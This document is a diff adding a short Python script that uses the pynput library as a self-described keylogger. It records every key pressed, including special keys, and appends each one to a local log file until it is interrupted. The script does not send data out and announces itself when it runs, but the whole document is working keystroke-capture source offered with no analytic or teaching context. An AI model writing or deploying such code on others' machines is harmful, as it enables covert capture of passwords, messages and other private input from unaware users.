@@ -1,0 +1,29 @@
+from pynput import keyboard
+
+def write_to_file(key):
+    """
+    Writes the pressed key to a log file.
+    """
+    with open("key_log.txt", "a") as log_file:
+        try:
+            # Replace special keys with readable names
+            log_file.write(key.char if hasattr(key, 'char') else f"[{key.name}]")
+        except AttributeError:
+            log_file.write(f"[{key}]")
+
+def on_press(key):
+    """
+    Callback for key press events.
+    """
+    write_to_file(key)
+
+def main():
+    print("Keylogger started. Press 'Ctrl + C' to stop.")
+    try:
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+    except KeyboardInterrupt:
+        print("\nKeylogger stopped.")
+
+if __name__ == "__main__":
+    main()
